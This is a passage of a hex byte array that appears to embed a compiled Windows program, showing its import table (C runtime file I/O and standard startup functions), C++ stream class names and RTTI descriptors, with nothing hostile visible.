0x48,	0x41, 0x45, 0x41, 0x55, 0x5F, 0x4D, 0x62, 0x73, 0x74, 0x61, 0x74, 0x65,	0x74, 0x40, 0x40, 0x50, 0x45, 0x42, 0x44, 0x31, 0x41, 0x45, 0x41, 0x50,	0x45, 0x42, 0x44, 0x50, 0x45, 0x41, 0x44, 0x33, 0x41, 0x45, 0x41, 0x50,	0x45, 0x41, 0x44, 0x40, 0x5A, 0x00, 0x4A, 0x02, 0x3F, 0x5F, 0x50, 0x6E,	0x69, 0x6E, 0x63, 0x40, 0x3F, 0x24, 0x62, 0x61, 0x73, 0x69, 0x63, 0x5F,	0x73, 0x74, 0x72, 0x65, 0x61, 0x6D, 0x62, 0x75, 0x66, 0x40, 0x44, 0x55,	0x3F, 0x24, 0x63, 0x68, 0x61, 0x72, 0x5F, 0x74, 0x72, 0x61, 0x69, 0x74,	0x73, 0x40, 0x44, 0x40, 0x73, 0x74, 0x64, 0x40, 0x40, 0x40, 0x73, 0x74,	0x64, 0x40, 0x40, 0x49, 0x45, 0x41, 0x41, 0x50, 0x45, 0x41, 0x44, 0x58,	0x5A, 0x00, 0xC5, 0x04, 0x3F, 0x73, 0x65, 0x74, 0x73, 0x74, 0x61, 0x74,	0x65, 0x40, 0x3F, 0x24, 0x62, 0x61, 0x73, 0x69, 0x63, 0x5F, 0x69, 0x6F,	0x73, 0x40, 0x44, 0x55, 0x3F, 0x24, 0x63, 0x68, 0x61, 0x72, 0x5F, 0x74,	0x72, 0x61, 0x69, 0x74, 0x73, 0x40, 0x44, 0x40, 0x73, 0x74, 0x64, 0x40,	0x40, 0x40, 0x73, 0x74, 0x64, 0x40, 0x40, 0x51, 0x45, 0x41, 0x41, 0x58,	0x48, 0x5F, 0x4E, 0x40, 0x5A, 0x00, 0x0C, 0x00, 0x3F, 0x3F, 0x30, 0x3F,	0x24, 0x62, 0x61, 0x73, 0x69, 0x63, 0x5F, 0x69, 0x6F, 0x73, 0x40, 0x44,	0x55, 0x3F, 0x24, 0x63, 0x68, 0x61, 0x72, 0x5F, 0x74, 0x72, 0x61, 0x69,	0x74, 0x73, 0x40, 0x44, 0x40, 0x73, 0x74, 0x64, 0x40, 0x40, 0x40, 0x73,	0x74, 0x64, 0x40, 0x40, 0x49, 0x45, 0x41, 0x41, 0x40, 0x58, 0x5A, 0x00,	0x25, 0x00, 0x3F, 0x3F, 0x30, 0x3F, 0x24, 0x62, 0x61, 0x73, 0x69, 0x63,	0x5F, 0x6F, 0x73, 0x74, 0x72, 0x65, 0x61, 0x6D, 0x40, 0x44, 0x55, 0x3F,	0x24, 0x63, 0x68, 0x61, 0x72, 0x5F, 0x74, 0x72, 0x61, 0x69, 0x74, 0x73,	0x40, 0x44, 0x40, 0x73, 0x74, 0x64, 0x40, 0x40, 0x40, 0x73, 0x74, 0x64,	0x40, 0x40, 0x51, 0x45, 0x41, 0x41, 0x40, 0x50, 0x45, 0x41, 0x56, 0x3F,	0x24, 0x62, 0x61, 0x73, 0x69, 0x63, 0x5F, 0x73, 0x74, 0x72, 0x65, 0x61,	0x6D, 0x62, 0x75, 0x66, 0x40, 0x44, 0x55, 0x3F, 0x24, 0x63, 0x68, 0x61,	0x72, 0x5F, 0x74, 0x72, 0x61, 0x69, 0x74, 0x73, 0x40, 0x44, 0x40, 0x73,	0x74, 0x64, 0x40, 0x40, 0x40, 0x31, 0x40, 0x5F, 0x4E, 0x40, 0x5A, 0x00,	0x89, 0x00, 0x3F, 0x3F, 0x31, 0x3F, 0x24, 0x62, 0x61, 0x73, 0x69, 0x63,	0x5F, 0x73, 0x74, 0x72, 0x65, 0x61, 0x6D, 0x62, 0x75, 0x66, 0x40, 0x44,	0x55, 0x3F, 0x24, 0x63, 0x68, 0x61, 0x72, 0x5F, 0x74, 0x72, 0x61, 0x69,	0x74, 0x73, 0x40, 0x44, 0x40, 0x73, 0x74, 0x64, 0x40, 0x40, 0x40, 0x73,	0x74, 0x64, 0x40, 0x40, 0x55, 0x45, 0x41, 0x41, 0x40, 0x58, 0x5A, 0x00,	0xD5, 0x04, 0x3F, 0x73, 0x68, 0x6F, 0x77, 0x6D, 0x61, 0x6E, 0x79, 0x63,	0x40, 0x3F, 0x24, 0x62, 0x61, 0x73, 0x69, 0x63, 0x5F, 0x73, 0x74, 0x72,	0x65, 0x61, 0x6D, 0x62, 0x75, 0x66, 0x40, 0x44, 0x55, 0x3F, 0x24, 0x63,	0x68, 0x61, 0x72, 0x5F, 0x74, 0x72, 0x61, 0x69, 0x74, 0x73, 0x40, 0x44,	0x40, 0x73, 0x74, 0x64, 0x40, 0x40, 0x40, 0x73, 0x74, 0x64, 0x40, 0x40,	0x4D, 0x45, 0x41, 0x41, 0x5F, 0x4A, 0x58, 0x5A, 0x00, 0x00, 0x43, 0x05,	0x3F, 0x78, 0x73, 0x67, 0x65, 0x74, 0x6E, 0x40, 0x3F, 0x24, 0x62, 0x61,	0x73, 0x69, 0x63, 0x5F, 0x73, 0x74, 0x72, 0x65, 0x61, 0x6D, 0x62, 0x75,	0x66, 0x40, 0x44, 0x55, 0x3F, 0x24, 0x63, 0x68, 0x61, 0x72, 0x5F, 0x74,	0x72, 0x61, 0x69, 0x74, 0x73, 0x40, 0x44, 0x40, 0x73, 0x74, 0x64, 0x40,	0x40, 0x40, 0x73, 0x74, 0x64, 0x40, 0x40, 0x4D, 0x45, 0x41, 0x41, 0x5F,	0x4A, 0x50, 0x45, 0x41, 0x44, 0x5F, 0x4A, 0x40, 0x5A, 0x00, 0x46, 0x05,	0x3F, 0x78, 0x73, 0x70, 0x75, 0x74, 0x6E, 0x40, 0x3F, 0x24, 0x62, 0x61,	0x73, 0x69, 0x63, 0x5F, 0x73, 0x74, 0x72, 0x65, 0x61, 0x6D, 0x62, 0x75,	0x66, 0x40, 0x44, 0x55, 0x3F, 0x24, 0x63, 0x68, 0x61, 0x72, 0x5F, 0x74,	0x72, 0x61, 0x69, 0x74, 0x73, 0x40, 0x44, 0x40, 0x73, 0x74, 0x64, 0x40,	0x40, 0x40, 0x73, 0x74, 0x64, 0x40, 0x40, 0x4D, 0x45, 0x41, 0x41, 0x5F,	0x4A, 0x50, 0x45, 0x42, 0x44, 0x5F, 0x4A, 0x40, 0x5A, 0x00, 0x7D, 0x00,	0x3F, 0x3F, 0x31, 0x3F, 0x24, 0x62, 0x61, 0x73, 0x69, 0x63, 0x5F, 0x69,	0x6F, 0x73, 0x40, 0x44, 0x55, 0x3F, 0x24, 0x63, 0x68, 0x61, 0x72, 0x5F,	0x74, 0x72, 0x61, 0x69, 0x74, 0x73, 0x40, 0x44, 0x40, 0x73, 0x74, 0x64,	0x40, 0x40, 0x40, 0x73, 0x74, 0x64, 0x40, 0x40, 0x55, 0x45, 0x41, 0x41,	0x40, 0x58, 0x5A, 0x00, 0x86, 0x00, 0x3F, 0x3F, 0x31, 0x3F, 0x24, 0x62,	0x61, 0x73, 0x69, 0x63, 0x5F, 0x6F, 0x73, 0x74, 0x72, 0x65, 0x61, 0x6D,	0x40, 0x44, 0x55, 0x3F, 0x24, 0x63, 0x68, 0x61, 0x72, 0x5F, 0x74, 0x72,	0x61, 0x69, 0x74, 0x73, 0x40, 0x44, 0x40, 0x73, 0x74, 0x64, 0x40, 0x40,	0x40, 0x73, 0x74, 0x64, 0x40, 0x40, 0x55, 0x45, 0x41, 0x41, 0x40, 0x58,	0x5A, 0x00, 0x9D, 0x02, 0x3F, 0x61, 0x6C, 0x77, 0x61, 0x79, 0x73, 0x5F,	0x6E, 0x6F, 0x63, 0x6F, 0x6E, 0x76, 0x40, 0x63, 0x6F, 0x64, 0x65, 0x63,	0x76, 0x74, 0x5F, 0x62, 0x61, 0x73, 0x65, 0x40, 0x73, 0x74, 0x64, 0x40,	0x40, 0x51, 0x45, 0x42, 0x41, 0x5F, 0x4E, 0x58, 0x5A, 0x00, 0x31, 0x01,	0x3F, 0x3F, 0x42, 0x69, 0x64, 0x40, 0x6C, 0x6F, 0x63, 0x61, 0x6C, 0x65,	0x40, 0x73, 0x74, 0x64, 0x40, 0x40, 0x51, 0x45, 0x41, 0x41, 0x5F, 0x4B,	0x58, 0x5A, 0x00, 0x00, 0x4D, 0x53, 0x56, 0x43, 0x50, 0x31, 0x34, 0x30,	0x2E, 0x64, 0x6C, 0x6C, 0x00, 0x00, 0x00, 0x00, 0x5F, 0x5F, 0x43, 0x78,	0x78, 0x46, 0x72, 0x61, 0x6D, 0x65, 0x48, 0x61, 0x6E, 0x64, 0x6C, 0x65,	0x72, 0x34, 0x00, 0x00, 0x23, 0x00, 0x5F, 0x5F, 0x73, 0x74, 0x64, 0x5F,	0x74, 0x65, 0x72, 0x6D, 0x69, 0x6E, 0x61, 0x74, 0x65, 0x00, 0x21, 0x00,	0x5F, 0x5F, 0x73, 0x74, 0x64, 0x5F, 0x65, 0x78, 0x63, 0x65, 0x70, 0x74,	0x69, 0x6F, 0x6E, 0x5F, 0x63, 0x6F, 0x70, 0x79, 0x00, 0x00, 0x22, 0x00,	0x5F, 0x5F, 0x73, 0x74, 0x64, 0x5F, 0x65, 0x78, 0x63, 0x65, 0x70, 0x74,	0x69, 0x6F, 0x6E, 0x5F, 0x64, 0x65, 0x73, 0x74, 0x72, 0x6F, 0x79, 0x00,	0x08, 0x00, 0x5F, 0x5F, 0x43, 0x5F, 0x73, 0x70, 0x65, 0x63, 0x69, 0x66,	0x69, 0x63, 0x5F, 0x68, 0x61, 0x6E, 0x64, 0x6C, 0x65, 0x72, 0x00, 0x00,	0x01, 0x00, 0x5F, 0x43, 0x78, 0x78, 0x54, 0x68, 0x72, 0x6F, 0x77, 0x45,	0x78, 0x63, 0x65, 0x70, 0x74, 0x69, 0x6F, 0x6E, 0x00, 0x00, 0x25, 0x00,	0x5F, 0x5F, 0x73, 0x74, 0x64, 0x5F, 0x74, 0x79, 0x70, 0x65, 0x5F, 0x69,	0x6E, 0x66, 0x6F, 0x5F, 0x64, 0x65, 0x73, 0x74, 0x72, 0x6F, 0x79, 0x5F,	0x6C, 0x69, 0x73, 0x74, 0x00, 0x00, 0x3E, 0x00, 0x6D, 0x65, 0x6D, 0x73,	0x65, 0x74, 0x00, 0x00, 0x56, 0x43, 0x52, 0x55, 0x4E, 0x54, 0x49, 0x4D,	0x45, 0x31, 0x34, 0x30, 0x5F, 0x31, 0x2E, 0x64, 0x6C, 0x6C, 0x00, 0x00,	0x56, 0x43, 0x52, 0x55, 0x4E, 0x54, 0x49, 0x4D, 0x45, 0x31, 0x34, 0x30,	0x2E, 0x64, 0x6C, 0x6C, 0x00, 0x00, 0x00, 0x00, 0x5F, 0x5F, 0x61, 0x63,	0x72, 0x74, 0x5F, 0x69, 0x6F, 0x62, 0x5F, 0x66, 0x75, 0x6E, 0x63, 0x00,	0x03, 0x00, 0x5F, 0x5F, 0x73, 0x74, 0x64, 0x69, 0x6F, 0x5F, 0x63, 0x6F,	0x6D, 0x6D, 0x6F, 0x6E, 0x5F, 0x76, 0x66, 0x70, 0x72, 0x69, 0x6E, 0x74,	0x66, 0x00, 0x39, 0x00, 0x5F, 0x69, 0x6E, 0x76, 0x61, 0x6C, 0x69, 0x64,	0x5F, 0x70, 0x61, 0x72, 0x61, 0x6D, 0x65, 0x74, 0x65, 0x72, 0x5F, 0x6E,	0x6F, 0x69, 0x6E, 0x66, 0x6F, 0x5F, 0x6E, 0x6F, 0x72, 0x65, 0x74, 0x75,	0x72, 0x6E, 0x00, 0x00, 0x78, 0x00, 0x66, 0x67, 0x65, 0x74, 0x63, 0x00,	0x7F, 0x00, 0x66, 0x70, 0x75, 0x74, 0x63, 0x00, 0x9D, 0x00, 0x75, 0x6E,	0x67, 0x65, 0x74, 0x63, 0x00, 0x00, 0x77, 0x00, 0x66, 0x66, 0x6C, 0x75,	0x73, 0x68, 0x00, 0x00, 0x98, 0x00, 0x73, 0x65, 0x74, 0x76, 0x62, 0x75,	0x66, 0x00, 0x88, 0x00, 0x66, 0x73, 0x65, 0x74, 0x70, 0x6F, 0x73, 0x00,	0x2F, 0x00, 0x5F, 0x66, 0x73, 0x65, 0x65, 0x6B, 0x69, 0x36, 0x34, 0x00,	0x79, 0x00, 0x66, 0x67, 0x65, 0x74, 0x70, 0x6F, 0x73, 0x00, 0x8A, 0x00,	0x66, 0x77, 0x72, 0x69, 0x74, 0x65, 0x00, 0x00, 0x83, 0x00, 0x66, 0x72,	0x65, 0x61, 0x64, 0x00, 0x24, 0x00, 0x5F, 0x75, 0x6E, 0x6C, 0x6F, 0x63,	0x6B, 0x5F, 0x66, 0x69, 0x6C, 0x65, 0x00, 0x00, 0x16, 0x00, 0x5F, 0x6C,	0x6F, 0x63, 0x6B, 0x5F, 0x66, 0x69, 0x6C, 0x65, 0x00, 0x00, 0x39, 0x00,	0x5F, 0x67, 0x65, 0x74, 0x5F, 0x73, 0x74, 0x72, 0x65, 0x61, 0x6D, 0x5F,	0x62, 0x75, 0x66, 0x66, 0x65, 0x72, 0x5F, 0x70, 0x6F, 0x69, 0x6E, 0x74,	0x65, 0x72, 0x73, 0x00, 0x74, 0x00, 0x66, 0x63, 0x6C, 0x6F, 0x73, 0x65,	0x00, 0x00, 0x89, 0x00, 0x73, 0x74, 0x72, 0x63, 0x70, 0x79, 0x5F, 0x73,	0x00, 0x00, 0x85, 0x00, 0x73, 0x74, 0x72, 0x63, 0x61, 0x74, 0x5F, 0x73,	0x00, 0x00, 0x08, 0x00, 0x5F, 0x63, 0x61, 0x6C, 0x6C, 0x6E, 0x65, 0x77,	0x68, 0x00, 0x19, 0x00, 0x6D, 0x61, 0x6C, 0x6C, 0x6F, 0x63, 0x00, 0x00,	0x36, 0x00, 0x5F, 0x69, 0x6E, 0x69, 0x74, 0x74, 0x65, 0x72, 0x6D, 0x00,	0x37, 0x00, 0x5F, 0x69, 0x6E, 0x69, 0x74, 0x74, 0x65, 0x72, 0x6D, 0x5F,	0x65, 0x00, 0x3F, 0x00, 0x5F, 0x73, 0x65, 0x68, 0x5F, 0x66, 0x69, 0x6C,	0x74, 0x65, 0x72, 0x5F, 0x64, 0x6C, 0x6C, 0x00, 0x18, 0x00, 0x5F, 0x63,	0x6F, 0x6E, 0x66, 0x69, 0x67, 0x75, 0x72, 0x65, 0x5F, 0x6E, 0x61, 0x72,	0x72, 0x6F, 0x77, 0x5F, 0x61, 0x72, 0x67, 0x76, 0x00, 0x00, 0x33, 0x00,	0x5F, 0x69, 0x6E, 0x69, 0x74, 0x69, 0x61, 0x6C, 0x69, 0x7A, 0x65, 0x5F,	0x6E, 0x61, 0x72, 0x72, 0x6F, 0x77, 0x5F, 0x65, 0x6E, 0x76, 0x69, 0x72,	0x6F, 0x6E, 0x6D, 0x65, 0x6E, 0x74, 0x00, 0x00, 0x34, 0x00, 0x5F, 0x69,	0x6E, 0x69, 0x74, 0x69, 0x61, 0x6C, 0x69, 0x7A, 0x65, 0x5F, 0x6F, 0x6E,	0x65, 0x78, 0x69, 0x74, 0x5F, 0x74, 0x61, 0x62, 0x6C, 0x65, 0x00, 0x00,	0x3C, 0x00, 0x5F, 0x72, 0x65, 0x67, 0x69, 0x73, 0x74, 0x65, 0x72, 0x5F,	0x6F, 0x6E, 0x65, 0x78, 0x69, 0x74, 0x5F, 0x66, 0x75, 0x6E, 0x63, 0x74,	0x69, 0x6F, 0x6E, 0x00, 0x22, 0x00, 0x5F, 0x65, 0x78, 0x65, 0x63, 0x75,	0x74, 0x65, 0x5F, 0x6F, 0x6E, 0x65, 0x78, 0x69, 0x74, 0x5F, 0x74, 0x61,	0x62, 0x6C, 0x65, 0x00, 0x1E, 0x00, 0x5F, 0x63, 0x72, 0x74, 0x5F, 0x61,	0x74, 0x65, 0x78, 0x69, 0x74, 0x00, 0x16, 0x00, 0x5F, 0x63, 0x65, 0x78,	0x69, 0x74, 0x00, 0x00, 0x18, 0x00, 0x66, 0x72, 0x65, 0x65, 0x00, 0x00,	0x61, 0x70, 0x69, 0x2D, 0x6D, 0x73, 0x2D, 0x77, 0x69, 0x6E, 0x2D, 0x63,	0x72, 0x74, 0x2D, 0x73, 0x74, 0x64, 0x69, 0x6F, 0x2D, 0x6C, 0x31, 0x2D,	0x31, 0x2D, 0x30, 0x2E, 0x64, 0x6C, 0x6C, 0x00, 0x61, 0x70, 0x69, 0x2D,	0x6D, 0x73, 0x2D, 0x77, 0x69, 0x6E, 0x2D, 0x63, 0x72, 0x74, 0x2D, 0x72,	0x75, 0x6E, 0x74, 0x69, 0x6D, 0x65, 0x2D, 0x6C, 0x31, 0x2D, 0x31, 0x2D,	0x30, 0x2E, 0x64, 0x6C, 0x6C, 0x00, 0x61, 0x70, 0x69, 0x2D, 0x6D, 0x73,	0x2D, 0x77, 0x69, 0x6E, 0x2D, 0x63, 0x72, 0x74, 0x2D, 0x66, 0x69, 0x6C,	0x65, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x2D, 0x6C, 0x31, 0x2D, 0x31,	0x2D, 0x30, 0x2E, 0x64, 0x6C, 0x6C, 0x00, 0x00, 0x61, 0x70, 0x69, 0x2D,	0x6D, 0x73, 0x2D, 0x77, 0x69, 0x6E, 0x2D, 0x63, 0x72, 0x74, 0x2D, 0x73,	0x74, 0x72, 0x69, 0x6E, 0x67, 0x2D, 0x6C, 0x31, 0x2D, 0x31, 0x2D, 0x30,	0x2E, 0x64, 0x6C, 0x6C, 0x00, 0x00, 0x61, 0x70, 0x69, 0x2D, 0x6D, 0x73,	0x2D, 0x77, 0x69, 0x6E, 0x2D, 0x63, 0x72, 0x74, 0x2D, 0x68, 0x65, 0x61,	0x70, 0x2D, 0x6C, 0x31, 0x2D, 0x31, 0x2D, 0x30, 0x2E, 0x64, 0x6C, 0x6C,	0x00, 0x00, 0xD3, 0x04, 0x52, 0x74, 0x6C, 0x43, 0x61, 0x70, 0x74, 0x75,	0x72, 0x65, 0x43, 0x6F, 0x6E, 0x74, 0x65, 0x78, 0x74, 0x00, 0xDA, 0x04,	0x52, 0x74, 0x6C, 0x4C, 0x6F, 0x6F, 0x6B, 0x75, 0x70, 0x46, 0x75, 0x6E,	0x63, 0x74, 0x69, 0x6F, 0x6E, 0x45, 0x6E, 0x74, 0x72, 0x79, 0x00, 0x00,	0xE1, 0x04, 0x52, 0x74, 0x6C, 0x56, 0x69, 0x72, 0x74, 0x75, 0x61, 0x6C,	0x55, 0x6E, 0x77, 0x69, 0x6E, 0x64, 0x00, 0x00, 0xBC, 0x05, 0x55, 0x6E,	0x68, 0x61, 0x6E, 0x64, 0x6C, 0x65, 0x64, 0x45, 0x78, 0x63, 0x65, 0x70,	0x74, 0x69, 0x6F, 0x6E, 0x46, 0x69, 0x6C, 0x74, 0x65, 0x72, 0x00, 0x00,	0x7B, 0x05, 0x53, 0x65, 0x74, 0x55, 0x6E, 0x68, 0x61, 0x6E, 0x64, 0x6C,	0x65, 0x64, 0x45, 0x78, 0x63, 0x65, 0x70, 0x74, 0x69, 0x6F, 0x6E, 0x46,	0x69, 0x6C, 0x74, 0x65, 0x72, 0x00, 0x9A, 0x05, 0x54, 0x65, 0x72, 0x6D,	0x69, 0x6E, 0x61, 0x74, 0x65, 0x50, 0x72, 0x6F, 0x63, 0x65, 0x73, 0x73,	0x00, 0x00, 0x89, 0x03, 0x49, 0x73, 0x50, 0x72, 0x6F, 0x63, 0x65, 0x73,	0x73, 0x6F, 0x72, 0x46, 0x65, 0x61, 0x74, 0x75, 0x72, 0x65, 0x50, 0x72,	0x65, 0x73, 0x65, 0x6E, 0x74, 0x00, 0x50, 0x04, 0x51, 0x75, 0x65, 0x72,	0x79, 0x50, 0x65, 0x72, 0x66, 0x6F, 0x72, 0x6D, 0x61, 0x6E, 0x63, 0x65,	0x43, 0x6F, 0x75, 0x6E, 0x74, 0x65, 0x72, 0x00, 0x22, 0x02, 0x47, 0x65,	0x74, 0x43, 0x75, 0x72, 0x72, 0x65, 0x6E, 0x74, 0x54, 0x68, 0x72, 0x65,	0x61, 0x64, 0x49, 0x64, 0x00, 0x00, 0xF0, 0x02, 0x47, 0x65, 0x74, 0x53,	0x79, 0x73, 0x74, 0x65, 0x6D, 0x54, 0x69, 0x6D, 0x65, 0x41, 0x73, 0x46,	0x69, 0x6C, 0x65, 0x54, 0x69, 0x6D, 0x65, 0x00, 0x6C, 0x03, 0x49, 0x6E,	0x69, 0x74, 0x69, 0x61, 0x6C, 0x69, 0x7A, 0x65, 0x53, 0x4C, 0x69, 0x73,	0x74, 0x48, 0x65, 0x61, 0x64, 0x00, 0x82, 0x03, 0x49, 0x73, 0x44, 0x65,	0x62, 0x75, 0x67, 0x67, 0x65, 0x72, 0x50, 0x72, 0x65, 0x73, 0x65, 0x6E,	0x74, 0x00, 0x3C, 0x00, 0x6D, 0x65, 0x6D, 0x63, 0x70, 0x79, 0x00, 0x00,	0x3D, 0x00, 0x6D, 0x65, 0x6D, 0x6D, 0x6F, 0x76, 0x65, 0x00, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0x00, 0x00, 0x00, 0x00,	0xCD, 0x5D, 0x20, 0xD2, 0x66, 0xD4, 0xFF, 0xFF, 0x32, 0xA2, 0xDF, 0x2D,	0x99, 0x2B, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00,	0x2F, 0x20, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xF8, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0xB8, 0x53, 0x00, 0x80, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0x2E, 0x3F, 0x41, 0x56, 0x74, 0x79, 0x70, 0x65,	0x5F, 0x69, 0x6E, 0x66, 0x6F, 0x40, 0x40, 0x00, 0xB8, 0x53, 0x00, 0x80,	0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0x2E, 0x3F, 0x41, 0x56, 0x62, 0x61, 0x64, 0x5F, 0x63, 0x61, 0x73, 0x74,	0x40, 0x73, 0x74, 0x64, 0x40, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0xB8, 0x53, 0x00, 0x80, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0x2E, 0x3F, 0x41, 0x56, 0x65, 0x78, 0x63, 0x65,	0x70, 0x74, 0x69, 0x6F, 0x6E, 0x40, 0x73, 0x74, 0x64, 0x40, 0x40, 0x00,	0x00, 0x00, 0x00, 0x00, 0xB8, 0x53, 0x00, 0x80, 0x01, 0x00, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x2E, 0x3F, 0x41, 0x56,	0x62, 0x61, 0x64, 0x5F, 0x61, 0x6C, 0x6C, 0x6F, 0x63, 0x40, 0x73, 0x74,	0x64, 0x40, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0xB8, 0x53, 0x00, 0x80,	0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0x2E, 0x3F, 0x41, 0x56, 0x62, 0x61, 0x64, 0x5F, 0x61, 0x72, 0x72, 0x61,	0x79, 0x5F, 0x6E, 0x65, 0x77, 0x5F, 0x6C, 0x65, 0x6E, 0x67, 0x74, 0x68,	0x40, 0x73, 0x74, 0x64, 0x40, 0x40, 0x00, 0x00, 0xB8, 0x53, 0x00, 0x80,	0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0x2E, 0x3F, 0x41, 0x56, 0x3F, 0x24, 0x62, 0x61, 0x73, 0x69, 0x63, 0x5F,	0x6F, 0x73, 0x74, 0x72, 0x65, 0x61, 0x6D, 0x40, 0x44, 0x55, 0x3F, 0x24,	0x63, 0x68, 0x61, 0x72, 0x5F, 0x74, 0x72, 0x61, 0x69, 0x74, 0x73, 0x40,	0x44, 0x40, 0x73, 0x74, 0x64, 0x40, 0x40, 0x40, 0x73, 0x74, 0x64, 0x40,	0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xB8, 0x53, 0x00, 0x80,	0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0x2E, 0x3F, 0x41, 0x56, 0x69, 0x6F, 0x73, 0x5F, 0x62, 0x61, 0x73, 0x65,	0x40, 0x73, 0x74, 0x64, 0x40, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0xB8, 0x53, 0x00, 0x80, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0x2E, 0x3F, 0x41, 0x56, 0x3F, 0x24, 0x5F, 0x49,	0x6F, 0x73, 0x62, 0x40, 0x48, 0x40, 0x73, 0x74, 0x64, 0x40, 0x40, 0x00,	0x00, 0x00, 0x00, 0x00, 0xB8, 0x53, 0x00, 0x80, 0x01, 0x00, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x2E, 0x3F, 0x41, 0x56,	0x3F, 0x24, 0x62, 0x61, 0x73, 0x69, 0x63, 0x5F, 0x69, 0x6F, 0x73, 0x40,	0x44, 0x55, 0x3F, 0x24, 0x63, 0x68, 0x61, 0x72, 0x5F, 0x74, 0x72, 0x61,	0x69, 0x74, 0x73, 0x40, 0x44, 0x40, 0x73, 0x74, 0x64, 0x40, 0x40, 0x40,	0x73, 0x74, 0x64, 0x40, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0xB8, 0x53, 0x00, 0x80, 0x01, 0x00, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x2E, 0x3F, 0x41, 0x56,	0x3F, 0x24, 0x62, 0x61, 0x73, 0x69, 0x63, 0x5F, 0x6F, 0x66, 0x73, 0x74,	0x72, 0x65, 0x61, 0x6D, 0x40, 0x44, 0x55, 0x3F, 0x24, 0x63, 0x68, 0x61,	0x72, 0x5F, 0x74, 0x72, 0x61, 0x69, 0x74, 0x73, 0x40, 0x44, 0x40, 0x73,	0x74, 0x64, 0x40, 0x40, 0x40, 0x73, 0x74, 0x64, 0x40, 0x40, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0xB8, 0x53, 0x00, 0x80, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0x2E, 0x3F, 0x41, 0x56, 0x3F, 0x24, 0x62, 0x61,	0x73, 0x69, 0x63, 0x5F, 0x73, 0x74, 0x72, 0x65, 0x61, 0x6D, 0x62, 0x75,	0x66, 0x40, 0x44, 0x55, 0x3F, 0x24, 0x63, 0x68, 0x61, 0x72, 0x5F, 0x74,	0x72, 0x61, 0x69, 0x74, 0x73, 0x40, 0x44, 0x40, 0x73, 0x74, 0x64, 0x40,	0x40, 0x40, 0x73, 0x74, 0x64, 0x40, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 